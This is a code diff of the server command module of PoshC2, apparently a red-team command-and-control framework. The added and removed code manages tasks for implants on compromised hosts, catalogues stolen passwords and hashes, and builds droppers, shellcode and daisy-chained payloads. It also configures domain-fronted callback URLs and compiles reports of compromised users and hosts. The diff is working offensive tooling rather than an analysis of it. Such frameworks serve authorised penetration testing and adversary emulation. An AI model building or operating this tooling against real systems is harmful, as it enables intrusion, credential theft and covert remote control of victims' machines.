+                task_id_str = "0" * (5 - len(str(task.id))) + str(task.id)
+                tasks_formatted += f"(Task {task_id_str}) : [{implant.numeric_id}] {task.command}\n"
+
+        print_good(f"Queued tasks:\n\n{tasks_formatted}{Colours.END}")
+
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_clear_tasks(user, command):
+    """
+    Clear all pending tasks not yet picked up by implants.
+
+    Examples:
+        clear-tasks
+    """
+    delete_object(NewTask)
+    print_good(f"Tasks queue was successfully cleared.{Colours.END}\n")
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_delete_task(user, command):
+    """
+    Remove a specific queued task if it has not yet been picked up by the implant.
+
+    If a task ID is not provided then the operator will be prompted.
+
+    Examples:
+        delete-task
+        delete-task 16
+    """
+    if command.lower() == "delete-task":
+        new_task_id = input("Enter task ID: ")
+        print()
+    else:
+        new_task_id = command.lower().replace("delete-task ", "")
+
+    delete_object(NewTask, {NewTask.id: new_task_id})
+    print_good(f"Task has been successfully removed from queue.{Colours.END}\n")
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_quit(user, command):
+    """
+    Quit PoshC2
+
+    Examples:
+        quit
+    """
+    ri = input("Are you sure you want to quit? (Y/n) ")
+
+    if ri == "" or ri.lower() == "y":
+        now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
+        c2_message = C2Message(
+            message=f"\n{Colours.BLUE}{now}: {user} logged off.{Colours.END}\n",
+            read="No"
+        )
+
+        insert_object(c2_message)
+        sys.exit(0)
+
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_creds(user, command):
+    """
+    Manage credentials for use with commands.
+
+    Many commands can take a Cred ID instead of manually entering credentials.
+
+    Examples:
+        creds
+        creds -add -domain=<domain> -username=<username> -password='<password>'/-hash=<hash>
+        creds -search <username>
+    """
+    if "-add " in command:
+        p = re.compile(r"-domain=(\S*)")
+        domain = re.search(p, command)
+
+        if domain:
+            domain = domain.group(1)
+
+        p = re.compile(r"-username=(\S*)")
+        username = re.search(p, command)
+
+        if username:
+            username = username.group(1)
+
+        p = re.compile(r"-password=(\S*)")
+        password = re.search(p, command)
+
+        if password:
+            password = password.group(1)
+
+        p = re.compile(r"-hash=(\S*)")
+        hash = re.search(p, command)
+
+        if hash:
+            hash = hash.group(1)
+
+        if not domain or not username:
+            print_bad("No domain or username specified.")
+            print(Colours.END)
+            input("Press Enter to continue...")
+            clear()
+            return
+
+        if password and hash:
+            print_bad("Both password and hash specified, only one of them must be provided.")
+            print(Colours.END)
+            input("Press Enter to continue...")
+            clear()
+            return
+
+        if not password and not hash:
+            print_bad("No password or hash specified.")
+            print(Colours.END)
+            input("Press Enter to continue...")
+            clear()
+            return
+
+        if password:
+            cred = Cred(
+                domain=domain,
+                username=username,
+                password=password,
+                hash=None
+            )
+        else:
+            cred = Cred(
+                domain=domain,
+                username=username,
+                password=None,
+                hash=hash
+            )
+
+        insert_object(cred)
+
+        if cred.id:
+            print_good(f"Credential was added successfully.{Colours.END}\n")
+
+        input("Press Enter to continue...")
+        clear()
+    elif "-search " in command:
+        username = command.replace("creds ", "")
+        username = username.replace("-search ", "")
+        username = username.strip()
+        creds = get_creds(username)
+
+        if creds:
+            password_table = Table(title="Passwords Compromised", pad_edge=True, show_edge=True, collapse_padding=True,
+                                   padding=0)
+            password_table.add_column("ID", no_wrap=True, justify="center")
+            password_table.add_column("Domain", no_wrap=True, justify="center")
+            password_table.add_column("Username", no_wrap=True, justify="center")
+            password_table.add_column("Password", no_wrap=True, justify="center")
+            hash_table = Table(title="Hashes Compromised", pad_edge=True, show_edge=True, collapse_padding=True,
+                               padding=0)
+            hash_table.add_column("ID", no_wrap=True, justify="center")
+            hash_table.add_column("Domain", no_wrap=True, justify="center")
+            hash_table.add_column("Username", no_wrap=True, justify="center")
+            hash_table.add_column("Hash", no_wrap=True, justify="center")
+
+            for cred in creds:
+                if cred.password:
+                    password_table.add_row(str(cred.id), cred.domain, cred.username, cred.password)
+                else:
+                    hash_table.add_row(str(cred.id), cred.domain, cred.username, cred.hash)
+
+            console = Console()
+            print(Colours.END)
+            console.print(password_table)
+            print()
+            print()
+            console.print(hash_table)
+            print()
+
+        input("Press Enter to continue...")
+        clear()
+    else:
+        creds = select_all(Cred)
+
+        if creds:
+            password_table = Table(title="Passwords Compromised", pad_edge=True, show_edge=True, collapse_padding=True,
+                                   padding=0)
+            password_table.add_column("ID", no_wrap=True, justify="center")
+            password_table.add_column("Domain", no_wrap=True, justify="center")
+            password_table.add_column("Username", no_wrap=True, justify="center")
+            password_table.add_column("Password", no_wrap=True, justify="center")
+
+            hash_table = Table(title="Hashes Compromised", pad_edge=True, show_edge=True, collapse_padding=True,
+                               padding=0)
+            hash_table.add_column("ID", no_wrap=True, justify="center")
+            hash_table.add_column("Domain", no_wrap=True, justify="center")
+            hash_table.add_column("Username", no_wrap=True, justify="center")
+            hash_table.add_column("Hash", no_wrap=True, justify="center")
+
+            for cred in creds:
+                if cred.password:
+                    password_table.add_row(str(cred.id), cred.domain, cred.username, cred.password)
+                else:
+                    hash_table.add_row(str(cred.id), cred.domain, cred.username, cred.hash)
+
+            console = Console()
+            print(Colours.END)
+            console.print(password_table)
+            print()
+            print()
+            console.print(hash_table)
+            print()
+
+        input("Press Enter to continue...")
+        clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_create_daisy_payload(user, command):
+    """
+    Create a new suite of payloads to be used for Daisy chaining.
+
+    The operator will be prompted for details.
+
+    Examples:
+        create-daisy-payload
+    """
+    new_daisy_payload_prompt = PromptSession(
+        history=FileHistory(f'{PoshProjectDirectory}/.create-daisy-payload-history'),
+        auto_suggest=AutoSuggestFromHistory(), style=style)
+    name = new_daisy_payload_prompt.prompt("Daisy Payload Name (e.g. DC1): ")
+    daisy_url = new_daisy_payload_prompt.prompt("Daisy URL (e.g. http://10.0.0.1:8888): ")
+
+    if "http://127.0.0.1" in daisy_url:
+        daisy_url = daisy_url.replace("http://127.0.0.1", "http://localhost")
+
+    if "https://127.0.0.1" in daisy_url:
+        daisy_url = daisy_url.replace("https://127.0.0.1", "https://localhost")
+
+    daisy_host_implant_id = new_daisy_payload_prompt.prompt("Daisy Host Implant ID (e.g. 5): ")
+    daisy_host_implant = get_implant_by_numeric_id(daisy_host_implant_id)
+    proxy_none = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
+    pbind_secret = PBindSecret
+    pbind_pipe_name = PBindPipeName
+    fcomm_file_name = FCommFilePath
+    daisy_implant_stage_url = f"{get_new_implant_url()}?d"
+
+    url = URL(
+        name=name,
+        url=daisy_url,
+        host_header="",
+        proxy_url=None,
+        proxy_username=None,
+        proxy_password=None,
+        credential_expiry=None
+    )
+
+    insert_object(url)
+
+    if url.id:
+        c2_server = select_first(C2Server)
+        new_daisy_payload = Payloads(
+            c2_server.kill_date,
+            c2_server.encryption_key,
+            c2_server.insecure,
+            c2_server.user_agent,
+            c2_server.referer,
+            daisy_implant_stage_url,
+            PayloadsDirectory,
+            powershell_proxy_command=proxy_none,
+            url_id=url.id,
+            pbind_pipe_name=pbind_pipe_name,
+            pbind_secret=pbind_secret,
+            fcomm_file_name=fcomm_file_name
+        )
+
+        new_daisy_payload.ps_dropper = new_daisy_payload.ps_dropper.replace(f"$pid;{daisy_url}",
+                                                                            f"$pid;{daisy_host_implant.user}@{daisy_host_implant.domain}")
+        new_daisy_payload.create_droppers(f"{name}_")
+        new_daisy_payload.create_shellcode(f"{name}_")
+        new_daisy_payload.create_raw(f"{name}_")
+        new_daisy_payload.create_donut_shellcode(f"{name}_")
+        new_daisy_payload.create_dynamic_payloads(f"{name}_")
+        print_good(f"\nNew daisy payloads were created successfully.\n{Colours.END}")
+
+    input("Press Enter to continue...")
+    clear()
+
+
+def create_payloads(user, command, creds=None, shellcode_only=False, pbind_only=False, linux_only=False):
+    debug_payloads = False
+
+    if "-debug" in command.lower():
+        debug_payloads = True
+
+    if "-credid" in command:
+        creds, params = get_cred_from_params(command, user)
+
+        if creds is None:
+            return
+
+        if not creds.password:
+            print_bad("Hash credential objects are not supported.")
+            print(Colours.END)
+            input("Press Enter to continue...")
+            clear()
+            return
+
+    new_payload_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.create-payload-history'),
+                                       auto_suggest=AutoSuggestFromHistory(), style=style)
+    name = new_payload_prompt.prompt("Payload Name (e.g. Scenario_One): ")
+    comms_url = new_payload_prompt.prompt(
+        "Domain or URL in array format (e.g. https://www.example.com,https://www.example2.com): ")
+    domain_front = new_payload_prompt.prompt(
+        "Domain front URL in array format (e.g. fjdsklfjdskl.cloudfront.net,jobs.azureedge.net): ")
+
+    comms_url, PayloadCommsHostCount = string_to_array(comms_url)
+    domain_front, DomainFrontHeaderCount = string_to_array(domain_front)
+
+    if PayloadCommsHostCount == DomainFrontHeaderCount:
+        pass
+    else:
+        print_bad("\nDifferent number of URLs and host headers.")
+        print(Colours.END)
+        input(f"Press Enter to continue...")
+        clear()
+        return
+
+    proxy_url = new_payload_prompt.prompt("Proxy URL (e.g. http://10.150.10.1:8080): ")
+    pbind_secret = new_payload_prompt.prompt(f"PBind Secret (e.g {PBindSecret}): ")
+    pbind_pipe_name = new_payload_prompt.prompt(f"PBind Pipe Name (e.g. {PBindPipeName}): ")
+    fcomm_file_name = new_payload_prompt.prompt(f"FComm File Name (e.g. {FCommFilePath}): ")
+    user_agent = new_payload_prompt.prompt(f"User Agent (e.g. {UserAgent}): ")
+
+    if not pbind_secret:
+        pbind_secret = PBindSecret
+
+    if not pbind_pipe_name:
+        pbind_pipe_name = PBindPipeName
+
+    if not user_agent:
+        user_agent = UserAgent
+
+    if not fcomm_file_name:
+        fcomm_file_name = FCommFilePath
+
+    proxy_username = ""
+    proxy_password = ""
+    credential_expiry = ""
+
+    if proxy_url:
+        if creds is not None:
+            proxy_username = f"{creds.domain}\\{creds.username}"
+            proxy_password = creds.password
+        else:
+            proxy_username = new_payload_prompt.prompt("Proxy User (e.g. Domain\\user): ")
+            proxy_password = new_payload_prompt.prompt("Proxy Password (e.g. Password1): ")
+
+        credential_expiry = new_payload_prompt.prompt("Password/Account Expiration Date (e.g. 15/03/2018): ")
+        implant_stage_url = f"{get_new_implant_url()}?p"
+    else:
+        implant_stage_url = get_new_implant_url()
+
+    url = URL(
+        name=name,
+        url=comms_url,
+        host_header=domain_front,
+        proxy_url=proxy_url,
+        proxy_username=proxy_username,
+        proxy_password=proxy_password,
+        credential_expiry=credential_expiry
+    )
+
+    insert_object(url)
+
+    if url.id:
+        c2_server = select_first(C2Server)
+        new_payload = Payloads(
+            c2_server.kill_date,
+            c2_server.encryption_key,
+            c2_server.insecure,
+            user_agent,
+            c2_server.referer,
+            implant_stage_url,
+            PayloadsDirectory,
+            url_id=url.id,
+            pbind_pipe_name=pbind_pipe_name,
+            pbind_secret=pbind_secret,
+            fcomm_file_name=fcomm_file_name
+        )
+
+        if shellcode_only:
+            new_payload.create_droppers(f"{name}_", debug_payloads=debug_payloads)
+            new_payload.create_shellcode(f"{name}_")
+            new_payload.create_donut_shellcode(f"{name}_")
+        elif pbind_only:
+            new_payload.create_pbind(f"{name}_", debug_payloads=debug_payloads)
+        elif linux_only:
+            new_payload.create_linux(f"{name}_")
+        else:
+            new_payload.create_all(f"{name}_", debug_payloads=debug_payloads)
+
+        print_good(f"\nNew payloads were created successfully.{Colours.END}\n")
+
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_create_payloads(user, command, creds=None, shellcode_only=False, pbind_only=False, linux_only=False):
+    """
+    Create a full new set of payloads which can have new details such as different comms urls,
+    proxy details, PBind pipe names and so on.
+
+    The operator will be prompted for details.
+
+    The -credid option can be passed to use a particular set of credentials.
+
+    The -debug option can be passed to perform a debug build, where supported.
+
+    Examples:
+        create-payloads
+        create-payloads -credid 6
+        create-payloads -debug
+    """
+    command = command.replace("create-payloads ", "")
+    create_payloads(user, command, creds, shellcode_only, pbind_only, linux_only)
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_create_shellcode(user, command, creds=None, shellcode_only=False, pbind_only=False, linux_only=False):
+    """
+    Create a new set of shellcode files which can have new details such as different comms urls,
+    proxy details, PBind pipe names and so on.
+
+    The operator will be prompted for details.
+
+    Examples:
+        create-shellcode
+    """
+    command = command.replace("create-shellcode ", "")
+    shellcode_only = True
+    create_payloads(user, command, creds, shellcode_only, pbind_only, linux_only)
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_create_pbind_payloads(user, command, creds=None, shellcode_only=False, pbind_only=False, linux_only=False):
+    """
+    Create a new set of pbind payloads which can have new details.
+
+    The operator will be prompted for details.
+
+    Examples:
+        create-pbind-payloads
+    """
+    command = command.replace("create-pbind-payloads ", "")
+    pbind_only = True
+    create_payloads(user, command, creds, shellcode_only, pbind_only, linux_only)
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_create_linux_payloads(user, command, creds=None, shellcode_only=False, pbind_only=False, linux_only=False):
+    """
+    Create a new set of linux payloads which can have new details.
+
+    The operator will be prompted for details.
+
+    Examples:
+        create-linux-payloads
+    """
+    command = command.replace("create-linux-payloads ", "")
+    linux_only = True
+    create_payloads(user, command, creds, shellcode_only, pbind_only, linux_only)
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_history(user, command):
+    """
+    Show the server command history.
+
+    Examples:
+        history
+    """
+    with open(f"{PoshProjectDirectory}.server-history") as history_file:
+        for line in history_file:
+            if line.startswith("+"):
+                print(Colours.GREEN + line.replace("+", "").replace("\n", ""))
+
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_use(user, command):
+    """
+    Choose a specific set of implant(s) to use.
+
+    Examples:
+        use 1
+        use 2-5
+        use 3,7,8
+        use all
+    """
+    command = command.replace("use ", "")
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_help(user, command):
+    """
+    Displays a list of all the available commands for the C2 server, or help for a particular command if specified.
+
+    Examples:
+        help
+        help opsec
+        help set-kill-date
+    """
+    if command == 'help':
+        for command in sorted(server_commands.keys()):
+            print_good(f"{command}{Colours.END}")
+
+        print_good(f"\nFor help with a particular command run {Colours.BLUE}help <command>{Colours.END}\n")
+    else:
+        help_command = command[4:].strip()
+
+        if help_command in server_commands_help:
+            if server_commands_help[help_command]:
+                print_good(f"    {server_commands_help[help_command].strip()}\n{Colours.END}")
+            else:
+                print_bad(f"No help available for command: {help_command}")
+                print(Colours.END)
+        else:
+            print_bad(f"Command not recognised: {help_command}")
+            print(Colours.END)
+
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_searchhelp(user, command):
+    """
+    Search the server command list for commands containing the keyword.
+
+    The search is case insensitive.
+
+    Examples:
+        searchhelp pushover
+    """
+    searchterm = command.replace("searchhelp ", "")
+    found = False
+
+    for line in sorted(server_commands.keys()):
+        if searchterm in line.lower():
+            if not found:
+                found = True
+
+            print_good(f"{line}{Colours.END}")
+
+    if found:
+        print()
+
+    input("Press Enter to continue...")
+    clear()
+
+
+def get_opsec_events_string(user, command):
+    entries = select_all(OpsecEntry)
+
+    if entries:
+        events_formatted = "ID  Date  Owner  Event  Note \n"
+
+        for entry in entries:
+            events_formatted += f"{entry.id}  {entry.date}  {entry.owner}  {entry.event}  {entry.note} \n"
+
+        return events_formatted
 
 
 def generate_opsec(user, command):
@@ -879,352 +1749,154 @@ def generate_opsec(user, command):
     output_file = open(reportname, 'w')
     output_file.write(get_opsec_string(user, command))
     events_string = get_opsec_events_string(user, command)
-    if (events_string):
+
+    if events_string:
         output_file.write("\nOpSec Events:")
         output_file.write(events_string)
+
     output_file.close()
 
 
-def do_listmodules(user, command):
-    mods = ""
-    for modname in os.listdir(ModulesDirectory):
-        mods += "%s\r\n" % modname
-    print(mods)
+def get_opsec_string(user, command):
+    implants = select_all(Implant)
+    comtasks = select_all(Task)
+    urls = select_all(URL)
+    users = ""
+    hosts = ""
+    uploads = ""
+    creds = ""
+    hashes = ""
+    url_formatted = "ID  Name  URL  HostHeader  ProxyURL  ProxyUsername  ProxyPassword  CredentialExpiry\n"
+
+    for url in (urls or []):
+        url_formatted += f"{url.id}  {url.name}  {url.url}  {url.host_header}  {url.proxy_url}  {url.proxy_username}  {url.proxy_password}  {url.credential_expiry} \n"
+
+    for implant in (implants or []):
+        if implant.hostname not in hosts:
+            hosts += f"{implant.hostname} \n"
+
+    for task in (comtasks or []):
+        implant = get_implant(task.implant_id)
+        command = task.command.lower()
+        output = task.output.lower()
+
+        if implant.user not in users:
+            users += f"{implant.domain}\\{implant.user} @ {implant.hostname}\n"
+
+        if "uploading file" in command:
+            uploadedfile = command
+            uploadedfile = uploadedfile.partition("uploading file: ")[2].strip()
+            filehash = uploadedfile.partition(" with md5sum:")[2].strip()
+            uploadedfile = uploadedfile.partition(" with md5sum:")[0].strip()
+            uploadedfile = uploadedfile.strip('"')
+            uploads += f"{implant.domain}\\{implant.user} @ {implant.hostname}\t{filehash}\t{uploadedfile}\n"
+
+        if "installing persistence" in output:
+            line = command.replace('\n', '')
+            line = line.replace('\r', '')
+            filenameuploaded = line.rstrip().split(":", 1)[1]
+            uploads += f"{implant.user} {filenameuploaded} \n"
+
+        if "written scf file" in output:
+            uploads += f"{implant.user} {output} \n"
+
+        creds, hashes = parse_creds(select_all(Cred))
+
+    return (
+        f"\nUsers Compromised: \n{users}\nHosts Compromised: \n{hosts}\nURLs: \n{url_formatted}\nFiles Uploaded: \n{uploads}\nCredentials Compromised: \n{creds}\nHashes Compromised: \n{hashes}")
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_show_ttps(user, command):
+    """
+    Show the first occurence of each MITRE TTP automatically extracted from activity.
+
+    Example:
+        show-ttps
+    """
+    ttps = get_mitre_ttps()
+
+    if ttps:
+        table = Table(title="MITRE TTPs", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
+        table.add_column("Technique ID", no_wrap=True, justify="center")
+        table.add_column("Technique Name", no_wrap=True, justify="center")
+        table.add_column("Tactics", no_wrap=True, justify="center")
+        table.add_column("Task ID", no_wrap=True, justify="center")
+
+        for ttp in ttps:
+            table.add_row(ttp.technique_id, ttp.technique_name, ttp.tactics, str(ttp.task_id))
+
+        console = Console()
+        print(Colours.END)
+        console.print(table)
+    else:
+        print_bad("No MITRE TTPs were extracted from implant activity.")
+        print(Colours.END)
+
     input("Press Enter to continue...")
     clear()
 
 
-def do_creds(user, command):
-    if "-add " in command:
-        p = re.compile(r"-domain=([^\s]*)")
-        domain = re.search(p, command)
-        if domain:
-            domain = domain.group(1)
-        p = re.compile(r"-username=([^\s]*)")
-        username = re.search(p, command)
-        if username:
-            username = username.group(1)
-        p = re.compile(r"-password=([^\s]*)")
-        password = re.search(p, command)
-        if password:
-            password = password.group(1)
-        else:
-            p = re.compile(r"-password=([^\s]*)")
-            password = re.search(p, command)
-            if password:
-                password = password.group(1)
-        p = re.compile(r"-hash=([^\s]*)")
-        hash = re.search(p, command)
-        if hash:
-            hash = hash.group(1)
-        if not domain or not username:
-            print_bad("Please specify a domain and username")
-            return
-        if password and hash:
-            print_bad("Please specify a password or a hash, but not both")
-            return
-        if not password and not hash:
-            print_bad("Please specify either a password or a hash")
-            return
-        insert_cred(domain, username, password, hash)
-        print_good("Credential added successfully")
-        return
-    elif "-search " in command:
-        username = command.replace("creds ", "")
-        username = username.replace("-search ", "")
-        username = username.strip()
-        creds, hashes = parse_creds(get_creds_for_user(username))
-        print_good("Credentials Compromised: \n%s\nHashes Compromised: \n%s" % (creds, hashes))
-        return
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_show_ttps_all(user, command):
+    """
+    Show all MITRE TTPs automatically extracted from activity.
+
+    Example:
+        show-ttps-all
+    """
+    ttps = select_all(MitreTTP)
+
+    if ttps:
+        table = Table(title="MITRE TTPs", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
+        table.add_column("Technique ID", no_wrap=True, justify="center")
+        table.add_column("Technique Name", no_wrap=True, justify="center")
+        table.add_column("Tactics", no_wrap=True, justify="center")
+        table.add_column("Task ID", no_wrap=True, justify="center")
+
+        for ttp in ttps:
+            table.add_row(ttp.technique_id, ttp.technique_name, ttp.tactics, str(ttp.task_id))
+
+        console = Console()
+        print(Colours.END)
+        console.print(table)
     else:
-        creds, hashes = parse_creds(get_creds())
-        print_good("\nCredentials Compromised: \n%s\nHashes Compromised: \n%s" % (creds, hashes))
+        print_bad("No MITRE TTPs were extracted from implant activity.")
+        print(Colours.END)
 
-
-def do_pwnself(user, command):
-    subprocess.Popen(["python2.7", "%s%s" % (PayloadsDirectory, "py_dropper.py")])
-    clear()
-
-
-def do_p(user, command):
-    return do_pwnself(user, command)
-
-
-def do_tasks(user, command):
-    alltasks = ""
-    tasks = get_newtasks_all()
-    if tasks is None:
-        print_good("No tasks queued!\r\n")
-    else:
-        for task in tasks:
-            imname = get_implantdetails(task.RandomURI)
-            if imname.ImplantID is not None:
-                alltasks += f"[{imname.ImplantID}] : {imname.Domain}\\{imname.User} | {task.Command} : {task.TaskID}\r\n"
-        print_good("Queued tasks:\r\n\r\n%s" % alltasks)
     input("Press Enter to continue...")
     clear()
-
-
-def do_cleartasks(user, command):
-    drop_newtasks()
-    print_good("Emptied tasks queue\r\n")
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_del_task(user, command):
-    deltask_id = command.lower().replace("kill", "").strip()
-    if not deltask_id:
-        deltask_id = input("Enter task ID: ")
-    del_newtasks(deltask_id)
-    print_good("task has been cleared\r\n")
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_quit(user, command):
-    ri = input("Are you sure you want to quit? (Y/n) ")
-    if ri.lower() == "n":
-        return
-    if ri == "" or ri.lower() == "y":
-        new_c2_message("%s logged off." % user)
-        sys.exit(0)
-
-
-def do_createdaisypayload(user, command):
-    name = input(Colours.GREEN + "Daisy Payload Name: e.g. DC1 ")
-    default_url = get_first_url(PayloadCommsHost, DomainFrontHeader)
-    daisyurl = input(f"Daisy URL: e.g. http://10.0.0.1:8888 ")
-    if ("http://127.0.0.1" in daisyurl):
-        daisyurl = daisyurl.replace("http://127.0.0.1", "http://localhost")
-    if ("https://127.0.0.1" in daisyurl):
-        daisyurl = daisyurl.replace("https://127.0.0.1", "https://localhost")
-    daisyhostid = input("Select Daisy Implant Host: e.g. 5 ")
-    daisyhost = get_implantbyid(daisyhostid)
-    proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
-    pbindsecret = PBindSecret
-    pbindpipename = PBindPipeName
-    fcomm_filename = FCommFileName
-
-    daisyurl, daisyurl_count = string_to_array(daisyurl)
-    daisyhostheader = ""
-
-    c = 0
-    daisyurls = daisyurl.split(",")
-    for url in daisyurls:
-        if c > 0:
-            daisyhostheader += ",\"\""
-        else:
-            daisyhostheader += "\"\""
-        c += 1
-
-    C2 = get_c2server_all()
-    urlId = new_urldetails(name, f"\"http://{daisyurl}\"", "\"\"", "", "", "", "")
-    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer,
-                          "%s?d" % get_newimplanturl(), PayloadsDirectory, PowerShellProxyCommand=proxynone, URLID=urlId, PBindPipeName=pbindpipename, PBindSecret=pbindsecret, FCommFileName=fcomm_filename)
-    newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (daisyurl), "$pid;%s@%s" % (daisyhost.User, daisyhost.Domain))
-    newPayload.CreateDroppers("%s_" % name)
-    newPayload.CreateShellcode("%s_" % name)
-    newPayload.CreateRaw("%s_" % name)
-    newPayload.CreateDlls("%s_" % name)
-    newPayload.CreateEXE("%s_" % name)
-    newPayload.CreateMsbuild("%s_" % name)
-    newPayload.CreateDonutShellcode("%s_" % name)
-    newPayload.BuildDynamicPayloads("%s_" % name)
-    print_good("Created new %s daisy payloads" % name)
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_createnewpayload(user, command, creds=None, shellcodeOnly=False, pbindOnly=False, linuxOnly=False):
-    params = re.compile("createnewpayload ", re.IGNORECASE)
-    params = params.sub("", command)
-    creds = None
-    if "-credid" in params:
-        creds, params = get_creds_from_params(params, user)
-        if creds is None:
-            return
-        if not creds['Password']:
-            print_bad("This command does not support credentials with hashes")
-            input("Press Enter to continue...")
-            clear()
-            return
-    name = input(Colours.GREEN + "Payload Name (e.g. Scenario_One): ")
-    comms_url = input("Domain or URL in array format (e.g. https://www.example.com,https://www.example2.com): ")
-    domainfront = input("Domain front URL in array format (e.g. fjdsklfjdskl.cloudfront.net,jobs.azureedge.net): ")
-    proxyurl = input("Proxy URL (e.g. http://10.150.10.1:8080): ")
-    pbindsecret = input(f"PBind Secret (e.g {PBindSecret}): ")
-    pbindpipename = input(f"PBind Pipe Name (e.g. {PBindPipeName}): ")
-    fcomm_filename = input(f"FComm File Name (e.g. {FCommFileName}): ")
-    user_agent = input(f"User Agent (e.g. {UserAgent}): ")
-
-    if not pbindsecret:
-        pbindsecret = PBindSecret
-
-    if not pbindpipename:
-        pbindpipename = PBindPipeName
-
-    if not user_agent:
-        user_agent = UserAgent
-
-    if not fcomm_filename:
-        fcomm_filename = FCommFileName
-    comms_url, PayloadCommsHostCount = string_to_array(comms_url)
-    domainfront, DomainFrontHeaderCount = string_to_array(domainfront)
-    if PayloadCommsHostCount == DomainFrontHeaderCount:
-        pass
-    else:
-        print("[-] Error - different number of host headers and URLs")
-        input("Press Enter to continue...")
-        clear()
-
-    proxyuser = ""
-    proxypass = ""
-    credsexpire = ""
-    if proxyurl:
-        if creds is not None:
-            proxyuser = "%s\\%s" % (creds['Domain'], creds['Username'])
-            proxypass = creds['Password']
-        else:
-            proxyuser = input(Colours.GREEN + "Proxy User (e.g. Domain\\user): ")
-            proxypass = input("Proxy Password (e.g. Password1): ")
-        credsexpire = input(Colours.GREEN + "Password/Account Expiration Date (e.g. 15/03/2018): ")
-        imurl = "%s?p" % get_newimplanturl()
-    else:
-        imurl = get_newimplanturl()
-    C2 = get_c2server_all()
-
-    urlId = new_urldetails(name, comms_url, domainfront, proxyurl, proxyuser, proxypass, credsexpire)
-    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, user_agent, C2.Referrer, imurl, PayloadsDirectory, URLID=urlId, PBindPipeName=pbindpipename, PBindSecret=pbindsecret, FCommFileName=fcomm_filename)
-
-    if shellcodeOnly:
-        newPayload.CreateDroppers("%s_" % name)
-        newPayload.CreateShellcode("%s_" % name)
-        newPayload.CreateDonutShellcode("%s_" % name)
-    elif pbindOnly:
-        newPayload.CreatePbind("%s_" % name)
-    elif linuxOnly:
-        newPayload.BuildLinuxPayloads("%s_" % name)
-    else:
-        newPayload.CreateAll("%s_" % name)
-
-    print_good("Created new payloads")
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_help(user, command):
-    print_good(server_help)
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_history(user, command):
-    with open('%s/.implant-history' % PoshProjectDirectory) as hisfile:
-        for line in hisfile:
-            if line.startswith("+"):
-                print(Colours.GREEN + line.replace("+", "").replace("\n", ""))
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_hide_dead_implants(user, command):
-    implants = get_implants()
-    if implants:
-        for implant in implants:
-            RandomURI = implant.RandomURI
-            Sleep = implant.Sleep.strip()
-            LastSeen = implant.LastSeen
-            LastSeenTime = datetime.strptime(LastSeen, "%Y-%m-%d %H:%M:%S")
-            LastSeenTime = LastSeenTime.replace(tzinfo=utcTimezone)
-            now = datetime.now(timezone.utc)
-            sleep_int = sleepint(Sleep)
-            nowMinus10Beacons = now - timedelta(seconds=(sleep_int * 10))
-            if nowMinus10Beacons > LastSeenTime:
-                hide_implant(RandomURI)
-    clear()
-
-
-def sleepint(sleep):
-    if(sleep.endswith('s')):
-        sleep_int = int(sleep[:-1])
-    elif(sleep.endswith('m')):
-        sleep_int = int(sleep[:-1]) * 60
-    elif(sleep.endswith('h')):
-        sleep_int = int(sleep[:-1]) * 60 * 60
-    else:
-        sleep_int = "error"
-    return sleep_int
-
-
-def do_use(user, command):
-    command = command.replace("use ", "")
-
-
-def do_label_implant(user, command, randomuri):
-    label = command.replace('label-implant', '').strip()
-    implant_type = get_implanttype(randomuri)
-    if "PB" in implant_type:
-        print("Cannot re-label a PBind implant at this time")
-    elif "FC" in implant_type:
-        print("Cannot re-label an FComm implant at this time")
-    else:
-        update_label(label, randomuri)
-
-
-def do_remove_label(user, command, randomuri):
-    update_label("", randomuri)
-
-
-def do_beacon(user, command, randomuri):
-    new_sleep = command.replace('beacon ', '').strip()
-    if not validate_sleep_time(new_sleep):
-        print_bad("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
-    else:
-        new_task(command, user, randomuri)
-
-
-def do_set_beacon(user, command, randomuri):
-    return do_beacon(user, command, randomuri)
-
-
-def do_unhide_implant(user, command, randomuri):
-    unhide_implant(randomuri)
-
-
-def do_hide_implant(user, command, randomuri):
-    hide_implant(randomuri)
-
-
-def clear():
-    try:
-        os.system('clear')
-    except Exception:
-        print("cls")
-        print(chr(27) + "[2J")
-    print(Colours.GREEN)
-    print(banner)
 
 
 def main(args):
     signal.signal(signal.SIGINT, catch_exit)
     user = None
     autohide = None
+
     if len(args) > 0:
         parser = argparse.ArgumentParser(description='The command line for handling implants in PoshC2')
